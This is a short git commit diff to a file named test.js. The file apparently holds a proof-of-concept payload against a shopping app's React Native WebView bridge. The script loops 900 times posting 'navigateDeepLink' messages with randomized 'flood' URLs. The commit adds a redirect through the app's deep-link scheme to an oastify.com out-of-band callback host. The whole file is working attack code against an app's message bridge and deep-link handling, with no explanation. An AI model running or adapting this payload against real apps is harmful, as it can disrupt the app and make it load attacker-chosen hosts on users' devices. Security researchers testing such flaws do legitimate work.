a012a979a7301653927ace35784e1c5e8fc616b7
GMchik <chupanovgadji@gmail.com>
2026-02-15 18:08:13 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,8 @@
-alert('test_js');
-for(let i=0; i<800; i++) {
+alert('test_js2');
+for(let i=0; i<900; i++) {
   window.ReactNativeWebView.postMessage(JSON.stringify({
   action: 'navigateDeepLink',
   data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
   }));
 }
-window.open = "https://google.com";
+window.location = "sbermarket://landing?url=https://176oahio3qfi2mkiwmi9n91v4mady5zto.oastify.com";
